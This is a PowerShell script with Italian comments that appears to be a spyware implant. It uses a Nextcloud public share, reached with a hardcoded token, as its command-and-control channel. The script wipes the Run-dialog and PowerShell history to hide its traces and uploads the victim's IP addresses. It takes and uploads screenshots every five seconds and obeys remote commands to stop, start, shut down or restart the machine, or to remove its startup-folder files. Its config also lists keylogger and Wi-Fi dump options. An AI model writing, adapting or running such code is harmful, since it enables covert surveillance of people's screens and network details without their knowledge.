
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$AccessToken = "mwgwxBBRLwxCeGj"

function Nextcloud-Upload {

	[CmdletBinding()]
	param ($SourceFilePath, $AccessToken)

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

	$nextcloudUrl = "https://liv.nl.tab.digital/"
	$file = $SourceFilePath
	$fileObject = Get-Item $file

	$headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"

	Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

function Nextcloud-Download{

    [CmdletBinding()]
    param ($FileName, $AccessToken, $destinationFolder)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $nextcloudUrl = "https://liv.nl.tab.digital/"
	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"
    
    $headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	Invoke-RestMethod -Uri $fileUrl -Headers $headers -OutFile "$destinationFolder\$fileName"
}

function Nextcloud-OpenFile {

    [CmdletBinding()]
    param ($FileName, $AccessToken)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $nextcloudUrl = "https://liv.nl.tab.digital/"
	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"
    
    $headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	try{
		return Invoke-RestMethod -Uri $fileUrl -Headers $headers -Method Get
	}
	catch{
		return "error"
	}
}

function json_reader{

	[CmdletBinding()]
    param ($FileName)

	$json = Get-Content $FileName | Out-String | ConvertFrom-Json

	$configObject = [PSCustomObject]@{

		Operations = $json.operations
		TimeStart = $json.time_start
		TimeEnd = $json.time_end
		NetworkMapping = $json.network_mapping
		WifiDump = $json.wifi_dump
		ScreenShots = $json.screenshots
		Keylogger = $json.Keylogger
		Scripts = $json.scripts
		String = $json.string

	}

	return $configObject
}

function Delete-Files {
	
	if(Test-Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\esegui_avvio.vbs"){
		Remove-Item "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\esegui_avvio.vbs" -Force
	}
	if(Test-Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\script.ps1"){
		Remove-Item "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\script.ps1"
	}

}

# ------------------------------------------------------------------------------------------------------------------------- #

# CARICA FILE DI CONFIGURAZIONE
	Nextcloud-Download -FileName "config.json" -AccessToken $AccessToken -destinationFolder "C:\Users\$env:USERNAME\Desktop\PowerShell"
	# Set-ItemProperty -Path "C:\Users\$env:USERNAME\Desktop\PowerShell\command.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
	$config = json_reader -FileName "C:\Users\$env:USERNAME\Desktop\PowerShell\config.json"

# ------------------------------------------------------------------------------------------------------------------------- #

# CANCELLA CRONOLOGIA ESEGUI
	$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
	if (Test-Path $regKey) {
		Remove-ItemProperty -Path $regKey -Name '*' -ErrorAction SilentlyContinue
	}

# ------------------------------------------------------------------------------------------------------------------------- #

# CANCELLA CRONOLOGIA POWERSHELL
	[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
	[System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')

# ------------------------------------------------------------------------------------------------------------------------- #

# CREAZIONE FILE IP
	if($config.NetworkMapping){
		$publicIP   = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
		$privateIP  = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Manual' }).IPAddress

		$date = (Get-Date).ToString("yyyy.MM.dd")
		$time = (Get-Date).ToString("HH.mm.ss")
		$outputFile = Join-Path $PSScriptRoot "ip-$data-$time.txt"

		$ipContent = @"
		Indirizzo IP pubblico: $publicIP
		Indirizzo IP privato: $privateIP
"@

		$ipContent | Out-File -FilePath $outputFile -Encoding UTF8

		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
	}

# ------------------------------------------------------------------------------------------------------------------------- #

$temp = 0
$p1   = [System.Windows.Forms.Cursor]::Position
$run  = $true

while ($true) {

	$now       = Get-Date
    $startTime = $config.TimeStart
    $endTime   = $config.TimeEnd

	Write-Host "command: " $command
	
	# CONTROLLO FILE DEI COMANDI
	$command = Nextcloud-OpenFile -FileName "command.txt" -AccessToken $AccessToken
	if($command -eq "stop"){
		$run = $false
	}
	if($command -eq "start"){
		$run = $true
	}
	if($command -eq "clear"){
		Delete-Files
	}
	if($command -eq "run"){
		# scarica uno script da un link e lo esegue
	}
	if($command -eq "off"){
		Stop-Computer -Force
	}
	if($command -eq "restart"){
		Restart-Computer -Force
	}

	# CREA SCREEN DELLO SCHERMO
	if ($now -ge $startTime -and $now -lt $endTime -and $run -and $config.ScreenShots) {

		# Crea e salva gli screen ogni 5 secondi
		$screens = [Windows.Forms.Screen]::AllScreens

		$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
		$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
		$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
		$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
	
		$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
		$bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
		$graphics = [Drawing.Graphics]::FromImage($bmp)
		
		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

		$date = (Get-Date).ToString("yyyy.MM.dd")
		$time = (Get-Date).ToString("HH.mm.ss")
		$bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$date-$time.png")
		$graphics.Dispose()
		$bmp.Dispose()
		
		$sourcePath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$date-$time.png"
		Nextcloud-Upload -SourceFilePath $sourcePath -AccessToken $AccessToken
		
		# verifico se il mouse si sta muovendo ogni 10 min
		if ($temp -eq 600) {
			
			$p2 = [System.Windows.Forms.Cursor]::Position
			if ($p1.X -eq $p2.X -and $p1.Y -eq $p2.Y) {
				
				# attendo che vengano rilevati nuovi movimenti del mouse
				$attendi = $true
				while($attendi){
					$p1 = [System.Windows.Forms.Cursor]::Position
					Start-Sleep -Seconds 5
					$p2 = [System.Windows.Forms.Cursor]::Position
					
					if($p1.X -ne $p2.X -or $p1.Y -ne $p2.Y){
						$attendi = $false
						$p1      = [System.Windows.Forms.Cursor]::Position
						$temp    = 0
					}
				}
				
			} else {
				$p1   = [System.Windows.Forms.Cursor]::Position
				$temp = 0
			}

		}
	}

	$temp += 5
	Start-Sleep -Seconds 5
}